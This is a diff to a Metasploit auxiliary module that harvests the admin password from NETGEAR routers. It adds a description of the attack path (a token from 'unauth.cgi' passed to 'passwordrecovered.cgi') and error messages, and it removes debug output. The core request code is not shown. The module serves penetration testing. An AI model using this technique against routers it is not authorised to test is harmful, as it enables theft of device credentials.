@@ -15,6 +15,9 @@ class MetasploitModule < Msf::Auxiliary
       'Description'    => %q{
         This module will collect the the password for the `admin` user. 
         The exploit will not complete if password recovery is set on the router.
+        The password is recieved by passing the token generated from `unauth.cgi`
+        to `passwordrecovered.cgi`. This exploit works on many different NETGEAR
+        products. The full list is available here: http://pastebin.com/dB4bTgxz
       },
       'Author'         =>
         [
@@ -76,10 +79,11 @@ class MetasploitModule < Msf::Auxiliary
 
         print_good("Creds found: #{username}/#{password}")
         
-      else # for debugging :)
+      else 
         print_error("#{rhost} is not vulnerable because password recovery is on.")
       end
     else
+      print_error("#{rhost} is not vulnerable: Not a NETGEAR device")
       return
     end
   end
@@ -95,10 +99,7 @@ class MetasploitModule < Msf::Auxiliary
 
     data = res.to_s
     
-    vprint_status("Printing response from #{datastore['RHOST']}")
-    vprint_status(data)
-    
-    #puts data
+    # Checks for the `WWW-Authenticate` header in the response
     if data.include? "WWW-Authenticate"
       marker_one = "Basic realm=\""
       marker_two = "\""
